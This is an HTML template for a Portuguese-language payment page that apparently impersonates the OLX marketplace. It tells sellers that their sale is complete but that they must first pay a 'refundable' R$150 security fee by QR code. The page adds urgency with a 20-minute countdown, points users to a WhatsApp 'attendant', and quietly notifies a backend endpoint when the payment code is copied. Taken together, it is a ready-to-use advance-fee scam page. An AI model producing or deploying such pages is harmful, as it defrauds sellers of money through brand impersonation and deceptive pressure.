
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento da Taxa</title>
        <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 968.19 513'%3E%3Cpath d='M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3' fill='%236e0ad6' fill-rule='evenodd'/%3E%3Cpath d='M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1' fill='%238ce563' fill-rule='evenodd'/%3E%3Cpath d='M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2' fill='%23f28000' fill-rule='evenodd'/%3E%3C/svg%3E">

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>
<body class="bg-white text-gray-800">
   <style>
    header {
                background-color: white;
                color: black;
                padding: 0.8rem 1rem;
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: left;
                font-size: 1.2rem;
                border-bottom: 2px solid #ddd;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                z-index: 1000;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            header img {
                width: 50px;
                height: 50px;
                margin-right: 10px;
            }
            
            /* Timer Styles */
            .timer-container {
                margin-top: 15px;
                border: 2px solid #d8b4fe;
                border-radius: 8px;
                padding: 10px;
                background-color: #f5f3ff;
            }
            
            .timer-display {
                font-size: 2rem;
                font-weight: bold;
                color: #6b21a8;
                text-align: center;
            }
            
            .timer-label {
                color: #4b5563;
                text-align: center;
                font-size: 0.9rem;
                margin-top: 5px;
            }
            
            .expired-message {
                color: #ef4444;
                font-weight: bold;
                font-size: 1rem;
                margin: 10px 0;
                line-height: 1.5;
                text-align: center;
            }

   </style>
    <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 968.19 513"><path d="M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3" fill="#6e0ad6" fill-rule="evenodd"/><path d="M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1" fill="#8ce563" fill-rule="evenodd"/><path d="M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2" fill="#f28000" fill-rule="evenodd"/></svg>
                </header>
        <div class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-orange-500">
            <h2 class="text-xl font-bold text-orange-700 mb-4">Parabéns pela venda!</h2>
            <p class="text-gray-700 mb-3">No entanto, você ainda não atingiu a pontuação necessária como vendedor em nossa plataforma. Para garantir a segurança de todos, implementamos uma política para prevenir fraudes e garantir que somente vendedores confiáveis possam concluir transações.</p>
            <h3 class="text-lg font-bold text-orange-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
            <p class="text-gray-700 mb-3">Por questão de segurança e para garantir que você realmente deseja vender seu produto, será cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes em nosso sistema. Não se preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-orange-500">R$ 150,00</span></p>
            <button id="btnPagar" class="bg-green-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-green-600">Pagar Taxa</button>
        </div>
    </div>

    <!-- Modal QR Code -->
    <div id="modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
        <div class="bg-white p-6 rounded-lg shadow-lg text-center relative w-96">
            <h3 class="text-lg font-bold text-purple-700 mb-2">QR Code para Pagamento</h3>
            <div id="qrcode" class="my-4"></div>
            
            <!-- Timer Container -->
            <div class="timer-container">
                <div id="timer-active">
                    <div id="timer-display" class="timer-display">--:--</div>
                    <div class="timer-label">Tempo restante para o QR Code</div>
                </div>
                <div id="timer-expired" class="hidden">
                    <div class="expired-message">
                        Tempo do Qrcode esgotado por gentileza solicite um novo Qrcode com seu atendente pelo Whatssap.
                    </div>
                </div>
            </div>
            
            <button id="btnCopiar" class="bg-purple-700 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-purple-800">Copiar Código</button>
            <button id="btnRedirecionar" class="hidden bg-blue-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-blue-600">
                Confirmar Pagamento
            </button>

            <button id="btnFechar" class="absolute top-2 right-2 text-gray-500">&times;</button>
        </div>
    </div>

    <script>
        // Timer functionality
        let timeLeft = null;
        let timerInterval;
        
        // Format time as MM:SS
        function formatTime(seconds) {
    if (seconds === null) return '--:--';
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return minutes.toString().padStart(2, '0') + ':' + remainingSeconds.toString().padStart(2, '0');
}

        
        // Update timer display
        function updateTimerDisplay() {
            document.getElementById('timer-display').textContent = formatTime(timeLeft);
        }
        
        // Show expired message
        function showExpiredMessage() {
            document.getElementById('timer-active').classList.add('hidden');
            document.getElementById('timer-expired').classList.remove('hidden');
            document.getElementById('btnRedirecionar').classList.add('hidden');
            document.getElementById('btnCopiar').classList.add('hidden');
        }
        
        // Start timer
        function startTimer() {
            // Check if there's a saved end time in localStorage
            const savedEndTime = localStorage.getItem("qrCodeTimerEnd");
            
            if (savedEndTime) {
                const endTime = parseInt(savedEndTime, 10);
                const now = Date.now();
                
                // If timer hasn't expired yet
                if (endTime > now) {
                    timeLeft = Math.floor((endTime - now) / 1000);
                } else {
                    // Timer has expired
                    timeLeft = 0;
                    updateTimerDisplay();
                    showExpiredMessage();
                    return;
                }
            } else {
                // Set a new 20-minute timer
                const endTime = Date.now() + 20 * 60 * 1000;
                localStorage.setItem("qrCodeTimerEnd", endTime.toString());
                timeLeft = 20 * 60;
            }
            
            updateTimerDisplay();
            
            // Clear any existing interval
            if (timerInterval) {
                clearInterval(timerInterval);
            }
            
            // Set up interval to update timer
            timerInterval = setInterval(function() {
                timeLeft--;
                updateTimerDisplay();
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    showExpiredMessage();
                }
            }, 1000);
        }
        
        // Reset timer
        function resetTimer() {
            const endTime = Date.now() + 20 * 60 * 1000;
            localStorage.setItem("qrCodeTimerEnd", endTime.toString());
            timeLeft = 20 * 60;
            
            document.getElementById('timer-expired').classList.add('hidden');
            document.getElementById('timer-active').classList.remove('hidden');
            document.getElementById('btnCopiar').classList.remove('hidden');
            
            startTimer();
        }

        // Original code
        document.getElementById("btnPagar").addEventListener("click", function () {
            document.getElementById("modal").classList.remove("hidden");
            new QRCode(document.getElementById("qrcode"), {
                text: "${produto.qr}", // Substitua pelo link real de pagamento
                width: 200,
                height: 200
            });
            
            // Start the timer when QR code is displayed
            startTimer();
        });
        
        document.getElementById("btnCopiar").addEventListener("click", function () {
            const codigo = "${produto.qr}"; 
            const actionId = "${produto.actionId}"; 

            navigator.clipboard.writeText(codigo).then(() => {
                fetch("/notificar-copia", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ 
                        codigo: codigo,
                        actionId: actionId
                    })
                });

                // Aguarda 20 segundos para mostrar o botão
                setTimeout(() => {
                    // Only show the button if timer hasn't expired
                    if (timeLeft > 0) {
                        document.getElementById("btnRedirecionar").classList.remove("hidden");
                    }
                }, 2000);
            });
        });

        // Adiciona o evento de clique no botão que aparecerá depois
        document.getElementById("btnRedirecionar").addEventListener("click", function () {
            window.location.href = "${RENDER_URL}/analise?id=${produto.actionId}";
        });

        document.getElementById("btnFechar").addEventListener("click", function () {
            document.getElementById("modal").classList.add("hidden");
            document.getElementById("qrcode").innerHTML = ""; // Limpa o QR Code ao fechar
            
            // Clear timer interval when modal is closed
            if (timerInterval) {
                clearInterval(timerInterval);
            }
        });
    </script>
</body>
</html>
